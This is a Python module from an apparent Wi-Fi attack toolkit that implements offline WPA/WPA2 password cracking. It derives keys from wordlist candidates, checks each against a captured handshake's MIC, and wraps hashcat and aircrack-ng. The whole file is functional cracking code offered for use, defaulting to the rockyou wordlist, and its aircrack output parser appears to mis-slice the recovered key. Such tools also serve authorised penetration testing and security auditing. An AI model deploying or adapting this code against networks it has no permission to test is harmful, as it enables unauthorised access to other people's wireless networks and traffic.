"""Dictionary (wordlist-based) WPA cracking attack.

Implements offline WPA/WPA2 PSK verification using captured handshakes
and a wordlist.  Supports both pure-Python PBKDF2 verification and
external tool integration (hashcat, aircrack-ng).
"""

import hashlib
import hmac
import os
import struct
import time
from typing import Callable, Dict, List, Optional, Tuple

from wifi_aio.exceptions import (
    CrackingError,
    WordlistNotFoundError,
    WiFiTimeoutError,
)


# ── WPA crypto constants ───────────────────────────────────────────────

PBKDF2_ITERATIONS = 4096
PMK_LENGTH = 32
PTK_LENGTH = 64
MIC_LENGTH = 16
NONCE_LENGTH = 32


def _pbkdf2_sha1(password: bytes, ssid: bytes, iterations: int = PBKDF2_ITERATIONS) -> bytes:
    """Derive a PMK from password and SSID using PBKDF2-SHA1."""
    dk = hashlib.pbkdf2_hmac("sha1", password, ssid, iterations, dklen=PMK_LENGTH)
    return dk


def _prf_512(key: bytes, a: bytes, b: bytes) -> bytes:
    """WPA PRF-512 pseudo-random function for PTK derivation."""
    result = b""
    for i in range(0, 4):
        hmac_data = a + b"\x00" + b + bytes([i])
        result += hmac.new(key, hmac_data, hashlib.sha1).digest()
    return result[:PTK_LENGTH]


def _derive_ptk(pmk: bytes, anonce: bytes, snonce: bytes, ap_mac: bytes, client_mac: bytes) -> bytes:
    """Derive the PTK from PMK and handshake parameters."""
    # Sort MACs and nonces as per 802.11 spec
    if ap_mac < client_mac:
        mac_min, mac_max = ap_mac, client_mac
    else:
        mac_min, mac_max = client_mac, ap_mac

    if anonce < snonce:
        nonce_min, nonce_max = anonce, snonce
    else:
        nonce_min, nonce_max = snonce, anonce

    a = b"Pairwise key expansion"
    b = mac_min + mac_max + nonce_min + nonce_max

    return _prf_512(pmk, a, b)


def _compute_mic(ptk: bytes, eapol_frame: bytes) -> bytes:
    """Compute the MIC for an EAPOL-Key frame using HMAC-SHA1."""
    # MIC is computed over the EAPOL frame with the MIC field zeroed
    # MIC field is at offset 81, length 16
    if len(eapol_frame) < 97:
        return b"\x00" * 16

    # Zero out the MIC field
    frame_copy = bytearray(eapol_frame)
    frame_copy[81:97] = b"\x00" * 16

    # HMAC-SHA1, take first 16 bytes
    mic = hmac.new(ptk[:16], bytes(frame_copy), hashlib.sha1).digest()[:MIC_LENGTH]
    return mic


class DictionaryAttack:
    """Wordlist-based WPA/WPA2 PSK cracking.

    Parameters
    ----------
    handshake:
        A dict with keys ``ssid``, ``anonce``, ``snonce``, ``ap_mac``,
        ``client_mac``, ``mic``, ``eapol_frame``.
    wordlist:
        Path to the wordlist file.
    thread_count:
        Number of parallel threads (pure-Python mode only).
    engine:
        Cracking engine: ``"python"``, ``"hashcat"``, or ``"aircrack"``.
    """

    def __init__(
        self,
        handshake: Dict,
        wordlist: str = "/usr/share/wordlists/rockyou.txt",
        thread_count: int = 1,
        engine: str = "python",
    ) -> None:
        self.handshake = handshake
        self.wordlist = wordlist
        self.thread_count = thread_count
        self.engine = engine

        self._found: Optional[str] = None
        self._tested = 0
        self._start_time: Optional[float] = None
        self._running = False
        self._callback: Optional[Callable[[int, Optional[str]], None]] = None

        # Pre-parse handshake fields
        self._ssid = handshake.get("ssid", "")
        self._ssid_bytes = self._ssid.encode("utf-8")
        self._anonce = bytes.fromhex(handshake.get("anonce", "")) if isinstance(handshake.get("anonce"), str) else handshake.get("anonce", b"")
        self._snonce = bytes.fromhex(handshake.get("snonce", "")) if isinstance(handshake.get("snonce"), str) else handshake.get("snonce", b"")
        self._ap_mac = bytes.fromhex(handshake.get("ap_mac", "").replace(":", "")) if isinstance(handshake.get("ap_mac"), str) else handshake.get("ap_mac", b"")
        self._client_mac = bytes.fromhex(handshake.get("client_mac", "").replace(":", "")) if isinstance(handshake.get("client_mac"), str) else handshake.get("client_mac", b"")
        self._target_mic = bytes.fromhex(handshake.get("mic", "")) if isinstance(handshake.get("mic"), str) else handshake.get("mic", b"")
        self._eapol_frame = bytes.fromhex(handshake.get("eapol_frame", "")) if isinstance(handshake.get("eapol_frame"), str) else handshake.get("eapol_frame", b"")

    # ── Public API ─────────────────────────────────────────────────────

    def run(
        self,
        callback: Optional[Callable[[int, Optional[str]], None]] = None,
        timeout: Optional[float] = None,
    ) -> Optional[str]:
        """Run the dictionary attack.

        Parameters
        ----------
        callback:
            Called periodically with ``(tested_count, password_or_none)``.
        timeout:
            Maximum seconds to run.

        Returns
        -------
        str or None
            The cracked password, or ``None`` if not found.
        """
        if not os.path.isfile(self.wordlist):
            raise WordlistNotFoundError(f"Wordlist not found: {self.wordlist}")

        self._callback = callback
        self._found = None
        self._tested = 0
        self._running = True
        self._start_time = time.time()

        try:
            if self.engine == "hashcat":
                result = self._run_hashcat(timeout)
            elif self.engine == "aircrack":
                result = self._run_aircrack(timeout)
            else:
                result = self._run_python(timeout)
        finally:
            self._running = False

        return result

    def stop(self) -> None:
        """Stop a running attack."""
        self._running = False

    @property
    def is_running(self) -> bool:
        return self._running

    @property
    def tested(self) -> int:
        return self._tested

    @property
    def elapsed(self) -> float:
        if self._start_time is None:
            return 0.0
        return time.time() - self._start_time

    @property
    def speed(self) -> float:
        """Passwords tested per second."""
        e = self.elapsed
        return self._tested / e if e > 0 else 0.0

    @property
    def found_password(self) -> Optional[str]:
        return self._found

    def verify_password(self, password: str) -> bool:
        """Verify a single password against the handshake.

        Returns ``True`` if the password produces a matching MIC.
        """
        return self._check_password(password)

    # ── Pure Python engine ─────────────────────────────────────────────

    def _run_python(self, timeout: Optional[float] = None) -> Optional[str]:
        """Run the dictionary attack using pure Python PBKDF2."""
        deadline = None if timeout is None else time.monotonic() + timeout

        with open(self.wordlist, "r", encoding="utf-8", errors="replace") as fh:
            for line in fh:
                if not self._running:
                    break
                if deadline is not None and time.monotonic() >= deadline:
                    break

                password = line.strip()
                if not password or len(password) < 8 or len(password) > 63:
                    continue

                if self._check_password(password):
                    self._found = password
                    if self._callback:
                        self._callback(self._tested, password)
                    return password

                self._tested += 1
                if self._callback and self._tested % 500 == 0:
                    self._callback(self._tested, None)

        return None

    def _check_password(self, password: str) -> bool:
        """Check a single password by computing PMK → PTK → MIC."""
        if not self._anonce or not self._snonce:
            return False
        if not self._ap_mac or not self._client_mac:
            return False
        if not self._target_mic or not self._eapol_frame:
            return False

        # Derive PMK
        pmk = _pbkdf2_sha1(password.encode("utf-8"), self._ssid_bytes)

        # Derive PTK
        ptk = _derive_ptk(pmk, self._anonce, self._snonce, self._ap_mac, self._client_mac)

        # Compute MIC
        computed_mic = _compute_mic(ptk, self._eapol_frame)

        return hmac.compare_digest(computed_mic, self._target_mic)

    # ── Hashcat engine ─────────────────────────────────────────────────

    def _run_hashcat(self, timeout: Optional[float] = None) -> Optional[str]:
        """Run the dictionary attack using hashcat."""
        from wifi_aio.cracking.hash_extractor import HashExtractor
        from wifi_aio.utils import run_command

        # Extract hash to a temp file
        extractor = HashExtractor()
        hash_file = extractor.extract_to_file(
            self.handshake, format="hashcat", output_path=None
        )

        try:
            cmd = [
                "hashcat",
                "-m", "22000",
                "-a", "0",
                hash_file,
                self.wordlist,
                "--force",
                "--potfile-disable",
            ]

            rc, stdout, stderr = run_command(cmd, timeout=timeout)

            # Parse output for cracked password
            for line in stdout.splitlines():
                if ":" in line and not line.startswith("#"):
                    parts = line.rsplit(":", 1)
                    if len(parts) == 2:
                        candidate = parts[1].strip()
                        if candidate:
                            self._found = candidate
                            self._tested = 1
                            return candidate

            return None
        finally:
            try:
                os.unlink(hash_file)
            except OSError:
                pass

    # ── Aircrack-ng engine ─────────────────────────────────────────────

    def _run_aircrack(self, timeout: Optional[float] = None) -> Optional[str]:
        """Run the dictionary attack using aircrack-ng."""
        from wifi_aio.utils import run_command
        import tempfile

        # Create a PCAP with the handshake (simplified)
        pcap_path = self.handshake.get("pcap_path")
        if not pcap_path:
            raise CrackingError("aircrack-ng engine requires 'pcap_path' in handshake dict")

        cmd = [
            "aircrack-ng",
            "-w", self.wordlist,
            pcap_path,
        ]

        rc, stdout, stderr = run_command(cmd, timeout=timeout)

        for line in stdout.splitlines():
            if "KEY FOUND!" in line:
                # Extract password from line like: [ KEY FOUND! [ password ] ]
                start = line.find("[")
                end = line.rfind("]")
                if start != -1 and end != -1:
                    password = line[start + 1: end].strip()
                    self._found = password
                    self._tested = 1
                    return password

        return None
